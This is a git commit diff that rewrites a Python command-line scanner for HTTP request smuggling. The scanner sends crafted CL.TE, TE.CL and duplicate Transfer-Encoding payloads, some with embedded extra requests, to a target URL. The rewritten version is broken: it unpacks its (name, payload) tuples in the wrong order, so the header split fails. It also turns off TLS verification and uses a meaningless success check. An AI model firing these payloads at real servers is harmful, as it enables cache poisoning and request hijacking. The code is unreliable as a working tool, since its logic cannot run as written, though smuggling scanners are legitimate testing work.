44f35d46490799de27c4a028eaea1a6594e84b3e
cbk914 <cbk914@riseup.net>
2023-02-14 17:07:49 +0100

    Update http-request-smuggler.py

--- http-request-smuggler.py
+++ http-request-smuggler.py
@@ -1,54 +1,53 @@
 #! /usr/bin/env python3
 # -*- coding: utf-8 -*-
 # Author: cbk914
-import argparse
 import requests
+import argparse
 
-# Define a list of HTTP methods to test
-http_methods = ['GET', 'POST', 'PUT', 'DELETE']
+# Define the argument parser
+parser = argparse.ArgumentParser(description="Check a URL for request smuggling vulnerabilities.")
+parser.add_argument("-u", "--url", help="The target URL", required=True)
+parser.add_argument("-d", "--debug", help="Print debug information", action="store_true")
+args = parser.parse_args()
 
-# Define a list of common request smuggling techniques to test
-smuggling_techniques = [
-    "Content-Length: 0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n",
-    "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n",
-    "Content-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n",
-    "Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n",
-    "Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n4\r\nxxxx\r\n0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n",
-    "GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\na\r\naaaaaaaaaaaaa\r\n0\r\n\r\n",
-    "GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nX: X\r\n\r\na\r\naaaaaaaaaaaaa\r\n0\r\n\r\n"
+# Define the request smuggling techniques to try
+techniques = [
+    ("TE", "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"),
+    ("CL.TE", "Content-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ"),
+    ("TE.CL", "Transfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\nZ\r\n0\r\n\r\n"),
+    ("FE", "Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\nGET / HTTP/1.1\r\n\r\n"),
+    ("CRLF", "Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nHTTP/1.1 200 OK\r\n\r\n")
 ]
 
-# Define a function to send requests and check for request smuggling vulnerabilities
-def check_vulnerabilities(url):
-    for method in http_methods:
-        for technique in smuggling_techniques:
-            try:
-                headers = {'Connection': 'keep-alive', 'Content-Type': 'text/plain', 'Content-Length': '0', 'X': 'X'}
-                headers.update({'Content-Length': str(len(technique))})
-                req = requests.request(method, url, headers=headers, data=technique, timeout=5, allow_redirects=False)
-                if req.status_code == 400:
-                    print("Potential request smuggling vulnerability found with method: %s, technique: %s" % (method, technique))
-            except requests.exceptions.Timeout:
-                print('Request error: Timed out while connecting to %s' % url)
-            except requests.exceptions.TooManyRedirects:
-                print('Request error: Too many redirects while connecting to %s' % url)
-            except requests.exceptions.RequestException as e:
-                print('Request error: %s' % e)
+# Set up the requests session
+session = requests.Session()
+session.verify = False
 
-if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description='Check for request smuggling vulnerabilities.')
-    parser.add_argument('-u', '--url', type=str, required=True, help='URL to check for vulnerabilities')
-    parser.add_argument('-d', '--debug', action='store_true', help='Print error messages to the screen')
-
-    args = parser.parse_args()
-
-    if args.debug:
-        requests.packages.urllib3.disable_warnings()
-        requests_log = requests.logging.getLogger("requests.packages.urllib3")
-        requests_log.setLevel(requests.logging.DEBUG)
-        requests_log.propagate = True
-
+# Send a request with a custom payload and check the response
+def check_technique(technique):
+    payload, expected_response = technique
+    headers = {"Content-Type": "application/x-www-form-urlencoded"}
+    headers[payload.split(": ")[0]] = payload.split(": ")[1]
     try:
-        check_vulnerabilities(args.url)
-    except requests.exceptions.RequestException as e:
-        print('Request error: %s' % e)
+        response = session.post(args.url, headers=headers, data=payload)
+    except Exception as e:
+        if args.debug:
+            print(f"Request error: {e}")
+        return False
+    if args.debug:
+        print(f"Response status code: {response.status_code}")
+        print(f"Response content: {response.content}")
+    if expected_response in response.content.decode():
+        print(f"Request smuggling vulnerability found using {payload.split(':')[0]} technique")
+        return True
+    return False
+
+# Try all the techniques and print a message if any are successful
+technique_found = False
+for technique in techniques:
+    if check_technique(technique):
+        technique_found = True
+
+# Print a message if no vulnerability is found
+if not technique_found:
+    print("No vulnerability found")
